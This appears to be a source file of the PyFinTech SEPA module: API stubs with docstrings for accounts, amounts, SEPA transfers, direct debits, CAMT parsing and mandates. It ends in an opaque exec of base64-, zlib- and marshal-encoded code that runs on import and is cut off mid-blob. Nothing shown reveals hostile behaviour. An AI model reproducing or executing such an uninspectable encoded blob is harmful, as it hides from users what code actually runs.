
###########################################################################
#
# LICENSE AGREEMENT
#
# Copyright (c) 2014-2024 joonis new media, Thimo Kraemer
#
# 1. Recitals
#
# joonis new media, Inh. Thimo Kraemer ("Licensor"), provides you
# ("Licensee") the program "PyFinTech" and associated documentation files
# (collectively, the "Software"). The Software is protected by German
# copyright laws and international treaties.
#
# 2. Public License
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this Software, to install and use the Software, copy, publish
# and distribute copies of the Software at any time, provided that this
# License Agreement is included in all copies or substantial portions of
# the Software, subject to the terms and conditions hereinafter set forth.
#
# 3. Temporary Multi-User/Multi-CPU License
#
# Licensor hereby grants to Licensee a temporary, non-exclusive license to
# install and use this Software according to the purpose agreed on up to
# an unlimited number of computers in its possession, subject to the terms
# and conditions hereinafter set forth. As consideration for this temporary
# license to use the Software granted to Licensee herein, Licensee shall
# pay to Licensor the agreed license fee.
#
# 4. Restrictions
#
# You may not use this Software in a way other than allowed in this
# license. You may not:
#
# - modify or adapt the Software or merge it into another program,
# - reverse engineer, disassemble, decompile or make any attempt to
#   discover the source code of the Software,
# - sublicense, rent, lease or lend any portion of the Software,
# - publish or distribute the associated license keycode.
#
# 5. Warranty and Remedy
#
# To the extent permitted by law, THE SOFTWARE IS PROVIDED "AS IS",
# WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
# LIMITED TO THE WARRANTIES OF QUALITY, TITLE, NONINFRINGEMENT,
# MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE, regardless of
# whether Licensor knows or had reason to know of Licensee particular
# needs. No employee, agent, or distributor of Licensor is authorized
# to modify this warranty, nor to make any additional warranties.
#
# IN NO EVENT WILL LICENSOR BE LIABLE TO LICENSEE FOR ANY DAMAGES,
# INCLUDING ANY LOST PROFITS, LOST SAVINGS, OR OTHER INCIDENTAL OR
# CONSEQUENTIAL DAMAGES ARISING FROM THE USE OR THE INABILITY TO USE THE
# SOFTWARE, EVEN IF LICENSOR OR AN AUTHORIZED DEALER OR DISTRIBUTOR HAS
# BEEN ADVISED OF THE POSSIBILITY OF THESE DAMAGES, OR FOR ANY CLAIM BY
# ANY OTHER PARTY. This does not apply if liability is mandatory due to
# intent or gross negligence.


"""
SEPA module of the Python Fintech package.

This module defines functions and classes to work with SEPA.
"""

__all__ = ['Account', 'Amount', 'SEPATransaction', 'SEPACreditTransfer', 'SEPADirectDebit', 'CAMTDocument', 'Mandate', 'MandateManager']

class Account:
    """Account class"""

    def __init__(self, iban, name, country=None, city=None, postcode=None, street=None):
        """
        Initializes the account instance.

        :param iban: Either the IBAN or a 2-tuple in the form of
            either (IBAN, BIC) or (ACCOUNT_NUMBER, BANK_CODE).
            The latter will be converted to the corresponding
            IBAN automatically. An IBAN is checked for validity.
        :param name: The name of the account holder.
        :param country: The country (ISO-3166 ALPHA 2) of the account
            holder (optional).
        :param city: The city of the account holder (optional).
        :param postcode: The postcode of the account holder (optional).
        :param street: The street of the account holder (optional).
        """
        ...

    @property
    def iban(self):
        """The IBAN of this account (read-only)."""
        ...

    @property
    def bic(self):
        """The BIC of this account (read-only)."""
        ...

    @property
    def name(self):
        """The name of the account holder (read-only)."""
        ...

    @property
    def country(self):
        """The country of the account holder (read-only)."""
        ...

    @property
    def city(self):
        """The city of the account holder (read-only)."""
        ...

    @property
    def postcode(self):
        """The postcode of the account holder (read-only)."""
        ...

    @property
    def street(self):
        """The street of the account holder (read-only)."""
        ...

    @property
    def address(self):
        """Tuple of unstructured address lines (read-only)."""
        ...

    def is_sepa(self):
        """
        Checks if this account seems to be valid
        within the Single Euro Payments Area.
        (added in v6.2.0)
        """
        ...

    def set_ultimate_name(self, name):
        """
        Sets the ultimate name used for SEPA transactions and by
        the :class:`MandateManager`.
        """
        ...

    @property
    def ultimate_name(self):
        """The ultimate name used for SEPA transactions."""
        ...

    def set_originator_id(self, cid=None, cuc=None):
        """
        Sets the originator id of the account holder (new in v6.1.1).

        :param cid: The SEPA creditor id. Required for direct debits
            and in some countries also for credit transfers.
        :param cuc: The CBI unique code (only required in Italy).
        """
        ...

    @property
    def cid(self):
        """The creditor id of the account holder (readonly)."""
        ...

    @property
    def cuc(self):
        """The CBI unique code (CUC) of the account holder (readonly)."""
        ...

    def set_mandate(self, mref, signed, recurrent=False):
        """
        Sets the SEPA mandate for this account.

        :param mref: The mandate reference.
        :param signed: The date of signature. Can be a date object
            or an ISO8601 formatted string.
        :param recurrent: Flag whether this is a recurrent mandate
            or not.
        :returns: A :class:`Mandate` object.
        """
        ...

    @property
    def mandate(self):
        """The assigned mandate (read-only)."""
        ...


class Amount:
    """
    The Amount class with an integrated currency converter.

    Arithmetic operations can be performed directly on this object.
    """

    default_currency = 'EUR'

    exchange_rates = {}

    implicit_conversion = False

    def __init__(self, value, currency=None):
        """
        Initializes the Amount instance.

        :param value: The amount value.
        :param currency: An ISO-4217 currency code. If not specified,
            it is set to the value of the class attribute
            :attr:`default_currency` which is initially set to EUR.
        """
        ...

    @property
    def value(self):
        """The amount value of type ``decimal.Decimal``."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code."""
        ...

    @property
    def decimals(self):
        """The number of decimal places (at least 2). Use the built-in ``round`` to adjust the decimal places."""
        ...

    @classmethod
    def update_exchange_rates(cls):
        """
        Updates the exchange rates based on the data provided by the
        European Central Bank and stores it in the class attribute
        :attr:`exchange_rates`. Usually it is not required to call
        this method directly, since it is called automatically by the
        method :func:`convert`.

        :returns: A boolean flag whether updated exchange rates
            were available or not.
        """
        ...

    def convert(self, currency):
        """
        Converts the amount to another currency on the bases of the
        current exchange rates provided by the European Central Bank.
        The exchange rates are automatically updated once a day and
        cached in memory for further usage.

        :param currency: The ISO-4217 code of the target currency.
        :returns: An :class:`Amount` object in the requested currency.
        """
        ...


class SEPATransaction:
    """
    The SEPATransaction class

    This class cannot be instantiated directly. An instance is returned
    by the method :func:`add_transaction` of a SEPA document instance
    or by the iterator of a :class:`CAMTDocument` instance.

    If it is a batch of other transactions, the instance can be treated
    as an iterable over all underlying transactions.
    """

    @property
    def bank_reference(self):
        """The bank reference, used to uniquely identify a transaction."""
        ...

    @property
    def iban(self):
        """The IBAN of the remote account (IBAN)."""
        ...

    @property
    def bic(self):
        """The BIC of the remote account (BIC)."""
        ...

    @property
    def name(self):
        """The name of the remote account holder."""
        ...

    @property
    def country(self):
        """The country of the remote account holder."""
        ...

    @property
    def address(self):
        """A tuple subclass which holds the address of the remote account holder. The tuple values represent the unstructured address. Structured fields can be accessed by the attributes *country*, *city*, *postcode* and *street*."""
        ...

    @property
    def ultimate_name(self):
        """The ultimate name of the remote account (ABWA/ABWE)."""
        ...

    @property
    def originator_id(self):
        """The creditor or debtor id of the remote account (CRED/DEBT)."""
        ...

    @property
    def amount(self):
        """The transaction amount of type :class:`Amount`. Debits are always signed negative."""
        ...

    @property
    def purpose(self):
        """A tuple of the transaction purpose (SVWZ)."""
        ...

    @property
    def date(self):
        """The booking date or appointed due date."""
        ...

    @property
    def valuta(self):
        """The value date."""
        ...

    @property
    def msgid(self):
        """The message id of the physical PAIN file."""
        ...

    @property
    def kref(self):
        """The id of the logical PAIN file (KREF)."""
        ...

    @property
    def eref(self):
        """The end-to-end reference (EREF)."""
        ...

    @property
    def mref(self):
        """The mandate reference (MREF)."""
        ...

    @property
    def purpose_code(self):
        """The external purpose code (PURP)."""
        ...

    @property
    def cheque(self):
        """The cheque number."""
        ...

    @property
    def info(self):
        """The transaction information (BOOKINGTEXT)."""
        ...

    @property
    def classification(self):
        """The transaction classification. For German banks it is a tuple in the form of (SWIFTCODE, GVC, PRIMANOTA, TEXTKEY), for French banks a tuple in the form of (DOMAINCODE, FAMILYCODE, SUBFAMILYCODE, TRANSACTIONCODE), otherwise a plain string."""
        ...

    @property
    def return_info(self):
        """A tuple of return code and reason."""
        ...

    @property
    def status(self):
        """The transaction status. A value of INFO, PDNG or BOOK."""
        ...

    @property
    def reversal(self):
        """The reversal indicator."""
        ...

    @property
    def batch(self):
        """Flag which indicates a batch transaction."""
        ...

    @property
    def camt_reference(self):
        """The reference to a CAMT file."""
        ...

    def get_account(self):
        """Returns an :class:`Account` instance of the remote account."""
        ...


class SEPACreditTransfer:
    """SEPACreditTransfer class"""

    def __init__(self, account, type='NORM', cutoff=14, batch=True, cat_purpose=None, scheme=None, currency=None):
        """
        Initializes the SEPA credit transfer instance.

        Supported pain schemes:

        - pain.001.003.03 (DE)
        - pain.001.001.03
        - pain.001.001.09 (*since v7.6*)
        - pain.001.001.03.ch.02 (CH)
        - pain.001.001.09.ch.03 (CH, *since v7.6*)
        - CBIPaymentRequest.00.04.00 (IT)
        - CBIPaymentRequest.00.04.01 (IT)
        - CBICrossBorderPaymentRequestLogMsg.00.01.01 (IT, *since v7.6*)

        :param account: The local debtor account.
        :param type: The credit transfer priority type (*NORM*, *HIGH*,
            *URGP*, *INST* or *SDVA*). (new in v6.2.0: *INST*,
            new in v7.0.0: *URGP*, new in v7.6.0: *SDVA*)
        :param cutoff: The cut-off time of the debtor's bank.
        :param batch: Flag whether SEPA batch mode is enabled or not.
        :param cat_purpose: The SEPA category purpose code. This code
            is used for special treatments by the local bank and is
            not forwarded to the remote bank. See module attribute
            CATEGORY_PURPOSE_CODES for possible values.
        :param scheme: The PAIN scheme of the document. If not
            specified, the scheme is set to *pain.001.001.03* for
            SEPA payments and *pain.001.001.09* for payments in
            currencies other than EUR.
            In Switzerland it is set to *pain.001.001.03.ch.02*,
            in Italy to *CBIPaymentRequest.00.04.00*.
        :param currency: The ISO-4217 code of the currency to use.
            It must match with the currency of the local account.
            If not specified, it defaults to the currency of the
            country the local IBAN belongs to.
        """
        ...

    @property
    def type(self):
        """The credit transfer priority type (read-only)."""
        ...

    def add_transaction(self, account, amount, purpose, eref=None, ext_purpose=None, due_date=None, charges='SHAR'):
        """
        Adds a transaction to the SEPACreditTransfer document.
        If :attr:`scl_check` is set to ``True``, it is verified that
        the transaction can be routed to the target bank.

        :param account: The remote creditor account.
        :param amount: The transaction amount as floating point number
            or an instance of :class:`Amount`.
        :param purpose: The transaction purpose text. If the value matches
            a valid ISO creditor reference number (starting with "RF..."),
            it is added as a structured reference. For other structured
            references a tuple can be passed in the form of
            (REFERENCE_NUMBER, PURPOSE_TEXT).
        :param eref: The end-to-end reference (optional).
        :param ext_purpose: The SEPA external purpose code (optional).
            This code is forwarded to the remote bank and the account
            holder. See module attribute EXTERNAL_PURPOSE_CODES for
            possible values.
        :param due_date: The due date. If it is an integer or ``None``,
            the next possible date is calculated starting from today
            plus the given number of days (considering holidays and
            the given cut-off time). If it is a date object or an
            ISO8601 formatted string, this date is used without
            further validation.
        :param charges: Specifies which party will bear the charges
            associated with the processing of an international
            transaction. Not applicable for SEPA transactions.
            Can be a value of SHAR (SHA), DEBT (OUR) or CRED (BEN).
            *(new in v7.6)*

        :returns: A :class:`SEPATransaction` instance.
        """
        ...

    def render(self):
        """Renders the SEPACreditTransfer document and returns it as XML."""
        ...

    @property
    def scheme(self):
        """The document scheme version (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id of this document (read-only)."""
        ...

    @property
    def account(self):
        """The local account (read-only)."""
        ...

    @property
    def cutoff(self):
        """The cut-off time of the local bank (read-only)."""
        ...

    @property
    def batch(self):
        """Flag if batch mode is enabled (read-only)."""
        ...

    @property
    def cat_purpose(self):
        """The category purpose (read-only)."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def new_batch(self, kref=None):
        """
        After calling this method additional transactions are added to a new
        batch (``PmtInf`` block). This could be useful if you want to divide
        transactions into different batches with unique KREF ids.

        :param kref: It is possible to set a custom KREF (``PmtInfId``) for
            the new batch (new in v7.2). Be aware that KREF ids should be
            unique over time and that all transactions must be grouped by
            particular SEPA specifications (date, sequence type, etc.) into
            separate batches. This is done automatically if you do not pass
            a custom KREF.
        """
        ...

    def send(self, ebics_client, use_ful=None):
        """
        Sends the SEPA document using the passed EBICS instance.

        :param ebics_client: The :class:`fintech.ebics.EbicsClient` instance.
        :param use_ful: Flag, whether to use the order type
            :func:`fintech.ebics.EbicsClient.FUL` for uploading the document
            or otherwise one of the suitable order types
            :func:`fintech.ebics.EbicsClient.CCT`,
            :func:`fintech.ebics.EbicsClient.CCU`,
            :func:`fintech.ebics.EbicsClient.CIP`,
            :func:`fintech.ebics.EbicsClient.AXZ`,
            :func:`fintech.ebics.EbicsClient.CDD`,
            :func:`fintech.ebics.EbicsClient.CDB`,
            :func:`fintech.ebics.EbicsClient.XE2`,
            :func:`fintech.ebics.EbicsClient.XE3` or
            :func:`fintech.ebics.EbicsClient.XE4`.
            If not specified, *use_ful* is set to ``True`` if the local
            account is originated in France, otherwise it is set to ``False``.
            With EBICS v3.0 the document is always uploaded via
            :func:`fintech.ebics.EbicsClient.BTU`.
        :returns: The EBICS order id.
        """
        ...


class SEPADirectDebit:
    """SEPADirectDebit class"""

    def __init__(self, account, type='CORE', cutoff=36, batch=True, cat_purpose=None, scheme=None, currency=None):
        """
        Initializes the SEPA direct debit instance.

        Supported pain schemes:

        - pain.008.003.02 (DE)
        - pain.008.001.02
        - pain.008.001.08 (*since v7.6*)
        - pain.008.001.02.ch.01 (CH)
        - CBISDDReqLogMsg.00.01.00 (IT)
        - CBISDDReqLogMsg.00.01.01 (IT)

        :param account: The local creditor account with an appointed
            creditor id.
        :param type: The direct debit type (*CORE* or *B2B*).
        :param cutoff: The cut-off time of the creditor's bank.
        :param batch: Flag if SEPA batch mode is enabled or not.
        :param cat_purpose: The SEPA category purpose code. This code
            is used for special treatments by the local bank and is
            not forwarded to the remote bank. See module attribute
            CATEGORY_PURPOSE_CODES for possible values.
        :param scheme: The PAIN scheme of the document. If not
            specified, the scheme is set to *pain.008.001.02*.
            In Switzerland it is set to *pain.008.001.02.ch.01*,
            in Italy to *CBISDDReqLogMsg.00.01.00*.
        :param currency: The ISO-4217 code of the currency to use.
            It must match with the currency of the local account.
            If not specified, it defaults to the currency of the
            country the local IBAN belongs to.
        """
        ...

    @property
    def type(self):
        """The direct debit type (read-only)."""
        ...

    def add_transaction(self, account, amount, purpose, eref=None, ext_purpose=None, due_date=None):
        """
        Adds a transaction to the SEPADirectDebit document.
        If :attr:`scl_check` is set to ``True``, it is verified that
        the transaction can be routed to the target bank.

        :param account: The remote debtor account with a valid mandate.
        :param amount: The transaction amount as floating point number
            or an instance of :class:`Amount`.
        :param purpose: The transaction purpose text. If the value matches
            a valid ISO creditor reference number (starting with "RF..."),
            it is added as a structured reference. For other structured
            references a tuple can be passed in the form of
            (REFERENCE_NUMBER, PURPOSE_TEXT).
        :param eref: The end-to-end reference (optional).
        :param ext_purpose: The SEPA external purpose code (optional).
            This code is forwarded to the remote bank and the account
            holder. See module attribute EXTERNAL_PURPOSE_CODES for
            possible values.
        :param due_date: The due date. If it is an integer or ``None``,
            the next possible date is calculated starting from today
            plus the given number of days (considering holidays, the
            lead time and the given cut-off time). If it is a date object
            or an ISO8601 formatted string, this date is used without
            further validation.

        :returns: A :class:`SEPATransaction` instance.
        """
        ...

    def render(self):
        """Renders the SEPADirectDebit document and returns it as XML."""
        ...

    @property
    def scheme(self):
        """The document scheme version (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id of this document (read-only)."""
        ...

    @property
    def account(self):
        """The local account (read-only)."""
        ...

    @property
    def cutoff(self):
        """The cut-off time of the local bank (read-only)."""
        ...

    @property
    def batch(self):
        """Flag if batch mode is enabled (read-only)."""
        ...

    @property
    def cat_purpose(self):
        """The category purpose (read-only)."""
        ...

    @property
    def currency(self):
        """The ISO-4217 currency code (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def new_batch(self, kref=None):
        """
        After calling this method additional transactions are added to a new
        batch (``PmtInf`` block). This could be useful if you want to divide
        transactions into different batches with unique KREF ids.

        :param kref: It is possible to set a custom KREF (``PmtInfId``) for
            the new batch (new in v7.2). Be aware that KREF ids should be
            unique over time and that all transactions must be grouped by
            particular SEPA specifications (date, sequence type, etc.) into
            separate batches. This is done automatically if you do not pass
            a custom KREF.
        """
        ...

    def send(self, ebics_client, use_ful=None):
        """
        Sends the SEPA document using the passed EBICS instance.

        :param ebics_client: The :class:`fintech.ebics.EbicsClient` instance.
        :param use_ful: Flag, whether to use the order type
            :func:`fintech.ebics.EbicsClient.FUL` for uploading the document
            or otherwise one of the suitable order types
            :func:`fintech.ebics.EbicsClient.CCT`,
            :func:`fintech.ebics.EbicsClient.CCU`,
            :func:`fintech.ebics.EbicsClient.CIP`,
            :func:`fintech.ebics.EbicsClient.AXZ`,
            :func:`fintech.ebics.EbicsClient.CDD`,
            :func:`fintech.ebics.EbicsClient.CDB`,
            :func:`fintech.ebics.EbicsClient.XE2`,
            :func:`fintech.ebics.EbicsClient.XE3` or
            :func:`fintech.ebics.EbicsClient.XE4`.
            If not specified, *use_ful* is set to ``True`` if the local
            account is originated in France, otherwise it is set to ``False``.
            With EBICS v3.0 the document is always uploaded via
            :func:`fintech.ebics.EbicsClient.BTU`.
        :returns: The EBICS order id.
        """
        ...


class CAMTDocument:
    """
    The CAMTDocument class is used to parse CAMT52, CAMT53 or CAMT54
    documents. An instance can be treated as an iterable over its
    transactions, each represented as an instance of type
    :class:`SEPATransaction`.

    Note: If orders were submitted in batch mode, there are three
    methods to resolve the underlying transactions. Either (A) directly
    within the CAMT52/CAMT53 document, (B) within a separate CAMT54
    document or (C) by a reference to the originally transfered PAIN
    message. The applied method depends on the bank (method B is most
    commonly used).
    """

    def __init__(self, xml, camt54=None):
        """
        Initializes the CAMTDocument instance.

        :param xml: The XML string of a CAMT document to be parsed
            (either CAMT52, CAMT53 or CAMT54).
        :param camt54: In case `xml` is a CAMT52 or CAMT53 document, an
            additional CAMT54 document or a sequence of such documents
            can be passed which are automatically merged with the
            corresponding batch transactions.
        """
        ...

    @property
    def type(self):
        """The CAMT type, eg. *camt.053.001.02* (read-only)."""
        ...

    @property
    def message_id(self):
        """The message id (read-only)."""
        ...

    @property
    def created(self):
        """The date of creation (read-only)."""
        ...

    @property
    def reference_id(self):
        """A unique reference number (read-only)."""
        ...

    @property
    def sequence_id(self):
        """The statement sequence number (read-only)."""
        ...

    @property
    def info(self):
        """Some info text about the document (read-only)."""
        ...

    @property
    def iban(self):
        """The local IBAN (read-only)."""
        ...

    @property
    def bic(self):
        """The local BIC (read-only)."""
        ...

    @property
    def name(self):
        """The name of the account holder (read-only)."""
        ...

    @property
    def currency(self):
        """The currency of the account (read-only)."""
        ...

    @property
    def date_from(self):
        """The start date (read-only)."""
        ...

    @property
    def date_to(self):
        """The end date (read-only)."""
        ...

    @property
    def balance_open(self):
        """The opening balance of type :class:`Amount` (read-only)."""
        ...

    @property
    def balance_close(self):
        """The closing balance of type :class:`Amount` (read-only)."""
        ...


class Mandate:
    """SEPA mandate class."""

    def __init__(self, path):
        """
        Initializes the SEPA mandate instance.

        :param path: The path to a SEPA PDF file.
        """
        ...

    @property
    def mref(self):
        """The mandate reference (read-only)."""
        ...

    @property
    def signed(self):
        """The date of signature (read-only)."""
        ...

    @property
    def b2b(self):
        """Flag if it is a B2B mandate (read-only)."""
        ...

    @property
    def cid(self):
        """The creditor id (read-only)."""
        ...

    @property
    def created(self):
        """The creation date (read-only)."""
        ...

    @property
    def modified(self):
        """The last modification date (read-only)."""
        ...

    @property
    def executed(self):
        """The last execution date (read-only)."""
        ...

    @property
    def closed(self):
        """Flag if the mandate is closed (read-only)."""
        ...

    @property
    def debtor(self):
        """The debtor account (read-only)."""
        ...

    @property
    def creditor(self):
        """The creditor account (read-only)."""
        ...

    @property
    def pdf_path(self):
        """The path to the PDF file (read-only)."""
        ...

    @property
    def recurrent(self):
        """Flag whether this mandate is recurrent or not."""
        ...

    def is_valid(self):
        """Checks if this SEPA mandate is still valid."""
        ...


class MandateManager:
    """
    A MandateManager manages all SEPA mandates that are required
    for SEPA direct debit transactions.

    It stores all mandates as PDF files in a given directory.

    .. warning::

        The MandateManager is still BETA. Don't use for production!
    """

    def __init__(self, path, account):
        """
        Initializes the mandate manager instance.

        :param path: The path to a directory where all mandates
            are stored. If it does not exist it will be created.
        :param account: The creditor account with the full address
            and an appointed creditor id.
        """
        ...

    @property
    def path(self):
        """The path where all mandates are stored (read-only)."""
        ...

    @property
    def account(self):
        """The creditor account (read-only)."""
        ...

    @property
    def scl_check(self):
        """
        Flag whether remote accounts should be verified against
        the SEPA Clearing Directory or not. The initial value is
        set to ``True`` if the *kontocheck* library is available
        and the local account is originated in Germany, otherwise
        it is set to ``False``.
        """
        ...

    def get_mandate(self, mref):
        """
        Get a stored SEPA mandate.

        :param mref: The mandate reference.
        :returns: A :class:`Mandate` object.
        """
        ...

    def get_account(self, mref):
        """
        Get the debtor account of a SEPA mandate.

        :param mref: The mandate reference.
        :returns: A :class:`Account` object.
        """
        ...

    def get_pdf(self, mref, save_as=None):
        """
        Get the PDF document of a SEPA mandate.

        All SEPA meta data is removed from the PDF.

        :param mref: The mandate reference.
        :param save_as: If given, it must be the destination path
            where the PDF file is saved.
        :returns: The raw PDF data.
        """
        ...

    def add_mandate(self, account, mref=None, signature=None, recurrent=True, b2b=False, lang=None):
        """
        Adds a new SEPA mandate and creates the corresponding PDF file.
        If :attr:`scl_check` is set to ``True``, it is verified that
        a direct debit transaction can be routed to the target bank.

        :param account: The debtor account with the full address.
        :param mref: The mandate reference. If not specified, a new
            reference number will be created.
        :param signature: The signature which must be the full name
            of the account holder. If given, the mandate is marked
            as signed. Otherwise the method :func:`sign_mandate`
            must be called before the mandate can be used for a
            direct debit.
        :param recurrent: Flag if it is a recurrent mandate or not.
        :param b2b: Flag if it is a B2B mandate or not.
        :param lang: ISO 639-1 language code of the mandate to create.
            Defaults to the language of the account holder's country.
        :returns: The created or passed mandate reference.
        """
        ...

    def sign_mandate(self, document, mref=None, signed=None):
        """
        Updates a SEPA mandate with a signed document.

        :param document: The path to the signed document, which can
            be an image or PDF file.
        :param mref: The mandate reference. If not specified and
            *document* points to an image, the image is scanned for
            a Code39 barcode which represents the mandate reference.
        :param signed: The date of signature. If not specified, the
            current date is used.
        :returns: The mandate reference.
        """
        ...

    def update_mandate(self, mref, executed=None, closed=None):
        """
        Updates the SEPA meta data of a mandate.

        :param mref: The mandate reference.
        :param executed: The last execution date. Can be a date
            object or an ISO8601 formatted string.
        :param closed: Flag if this mandate is closed.
        """
        ...

    def archive_mandates(self, zipfile):
        """
        Archives all closed SEPA mandates.

        Currently not implemented!

        :param zipfile: The path to a zip file.
        """
        ...



from typing import TYPE_CHECKING
if not TYPE_CHECKING:
    import marshal, zlib, base64
    exec(marshal.loads(zlib.decompress(base64.b64decode(
        b'eJzEvQlck0f+Pz5PLsIdSLivICiEI5wiIqIIKjdKiHeBAAFiuUyIitVWq1UQD/ACtAp4VPBE0XofnfHbtd22Szbtgqzbtbvdbs9drfZY9+h/Zp4Egke3dnd/f146mWee'
        b'ueczn3l/PvOZef4ILP64pt/7y7GzEyiAFkQALaNgPIGWs4ibZw0e+1NwxjOsL9gUorLFodxF/DFgvClkEv5fitOmcBYJxgAFz5xCzSyyGgMWDecgBeV86wqZ4OFiG8X0'
        b'WcnSqppSfaVaWlMmratQS2fV11XUVEtnaKrr1CUV0lpVyfOqcrXcxia/QqMzxy1Vl2mq1Tppmb66pE5TU62TqqpLpSWVKp0Oh9bVSJfVaJ+XLtPUVUhJEXKbkiCLxpAm'
        b'2JL2P8ROAShgCjgF3AJeAb9AUGBVICywLrApsC2wK7AvcChwLBAVOBU4F4gLJAUuBa4FbgXuBR4FngVeBd4FPgW+BX4F0gL/gjEFAQWBBWMLxhUE7QRKN6W30kPprwxU'
        b'+imdlZ5KodJKKVXaK3lKR6WNUqy0U1orXZReSqDkKkVKX+VY5TilRMlXOih9lO5KV6WtcoxSoOQoGWWAMkjpFBtMRmaxsDo4P3Ckt6tlvkAZPPKslI34pSA5OFkWCPyf'
        b'EFoGJnP9QBljXS7j5JRYjnE0/i8m3cKjZFEOZA45lULs/yaQA3BYrY9tkV2+3SSgH4sDHRahNagJNeZmzUbd6agBbc6Voc3pylnhAhA0nYeuocvorIyr98Zx0Wu+8EJm'
        b'elh6OGpEm7L56GogcEAbuTkadEDvQiK0w0P2JAI/rBjweAzsmI6O6n3Im13zuXnKUJouOx1tlqXzgDPazoUX4f4kGUfvhePEiuHBmeh0ZnQMjpCJtuSm84GjP3dSBuqj'
        b'70OK0Vq4zpe8T89mXzugE9woeAbgHDxxDHg5d4aOvMOloE0M4LjbpHNg7zjYpQ8krw9Mhatt0WlHdFYHGwtWoHO16MwS2ORoD4B3AM8K98QrMobmhF6eaIuasjLQJi48'
        b'iV4GXHSVgXvgCdiII4SQvLbjxq7JhMeDcW9szESbYGMuqRPcHJETLhOAmfWoabrVSrhGjRO4kQQd8LgN6sM1y6p8PpcP+CsZdDDZGb91J29Pj0GXQzPCw7LD5QwIhjvs'
        b'XLg28GCyqTou0lWhaWEhqDGLNAs2wYu2qJmDTgRXlTAWQx9jHvob2EmKLsDDj2mTh2lSgGlXiOkVYMq1xZRrj6nUEVOtE6ZsMaZaF0yvbphqPTCde2G698H07Iep3R/T'
        b'cACeAYS2g5TBSpkyRBmqDFOGK+XKCGWkMkoZrYxRxsbGmGibybe1oG0Opm3GgrY5o6iYSeZQ2n4s9Om07f0YbeeytP0HrQDYASACgS+Ghc3NAjTwTUAJHtRyq7PKZ/PZ'
        b'wL9NtcbRQOT1tEq77OpANnCdNQ/gX2nRSr3d26nWoAdU2uDg/pfceQ+cwdS74nrG67lfRu32dmUqCVv1XNbG9EasE4KpRdG3tYHRfwU0+EbAfccdczXenFl3mH+5X567'
        b'HAwBfRgZ3q32aDWeZk0Rs4OD0caINEwzsCc/OCMbbQ2Tp6sjwjOyGVDtaD1ZPUWfghPMRXuDdXXapUv0OnQO9aIz6DR6HZ1CZ1EfbIUnHYV2Ng7W9rZwK2yAm6IjY6Pj'
        b'osbHwHOwlwfg1YXW6DgvQp+B81mILqF9mVkZOenZmWgrnt6b0EY8PRrRZtTkjxoigsNC5LLwUHgSdsNjeTiD06gVtaCdqBntQtvRjrkAuEXaOy+BF0cRGulVQtT3ywih'
        b'cQjzxaTGYPLix3JNpMDJ51mQAtd31EAruaMGnZPMpaTwWOgwKVQ8Sgq8x0iBl6MlY6lp/JOAo5uJfelD3L6SfW+L3nG/cfM94Wpmmnt21/76+Px10byoko27YUX3Fumc'
        b'24u/dp/Wtnbw1OC7kreL3uZ98Ks1sq2/ynIRvGcHvnpRmPBbWxn/AZmieUlwBx7CjbgbN3EBbyIThw7AUy9MeuCBX+rh62Whcty/jWEMEOBIV+EWTjg6//wD0k0auN01'
        b'NDw4LZwDBOmYEezGr67B8w8Iz+S4hIWGo81ZUXwg8EbtCxh03FlD36A+sQ1qSoPHcaRVmPtUzZgOD8l4Q5xgmRZTMBhxdKQPpKtXrx5ySSzT1qxQV0vL2IVXrlPXqpKG'
        b'uHpNqdaZlEZiz8LO96vB3RkcIHFtndAyoS12++SG1EGxC/vQkdCesCfRKA4eEMsNYrlRHEleurUmtCS0abolRrF8QBxtEEcPiOMN4nijOKHfLuE+GROtFXZkgiHralWV'
        b'WofXfPUQT6Ut1w1ZFRZq9dWFhUO2hYUllWpVtb4Wh4zUX4CdoiIpboLWiQQ6m51U8jYWOw9Xg++mcxjG5yMHt6bnV9ve5fAZyS1b56aJH/Ec12UPCh1vCcXf38N8VWR+'
        b'enifkMMOQSA4aBvBLeE8iXgqCP1yTfTLoxQsiOUNUzD/v0jBjzEzm8co2CmHLqPjg+AeXRYfvo5ex1TQA+BhdO0FPemYwNwJmVl8fTlgZABtgJ3JelfCXS4qUAfqy+Wj'
        b'lycDhg/gWUyIO+mqgy5g5rEONeXi3OApwEwHaGcBOqeX4HeznOEFW7yKb1kAGCcAL8GD6KyeVAgefGlBaDYfdsIDgJkN0J7aeXoyGOFoW2aoXACKAbMQoMOoIYYWj3aj'
        b'ffAE2o5j7oMnAVgBsl1gr96RkJswAm3HgxtWbwPCptXLrGnBS+PgmUl4ONArcDNqJD/t1bQAAbP4BRJ+iA8vYZeHLtD+CMmZDi/hXFArvIxOk58DcD9bdC/sRp2IvjyH'
        b'9sqx64tfkUSeK3PgJQyR0V64i+S2F1dzA7vWroPrMYejL6/AbaiD/LyKdtBk8Nwie3gJ1x11wn1oD/6xRpfYN6/AragdHcAVtEXdaC+whQ1jaLXhhoJKBc4tCDagiyCo'
        b'Cu6i3eidAM+h7XhKRGKOehBEPg9fp833gF0rMW9ttXKCLWRpAIVSMW2NLbqYivp0qG8phi6ZgaibCYTrrVimZnvyFxzdL0mT63+7qjnX9uWpov/ruHTxk47E4NS6z+90'
        b'KZw+kn16e7qwvOlEcmprWHNSxu/PRYm5Zy/Y9f19z4St56IK+xevP/IeJ/H/pGt56dFvjZkeZ3/Tf9lfPv5Hq0eF8uuvJhw6vuCzM6mO2QXF7yf+bcHxzBVfd6mtvoqJ'
        b'WJB47eDlvpll3/y9sdeHyS3zU517GFV5xhh1R2VTVb50w9auOVOSXn5HE7NgevzNaWGzhFcve37F/W5nXOY19YmeX774p5yDyfrDoguV277vqHyn7uySNbpVXNtx/stX'
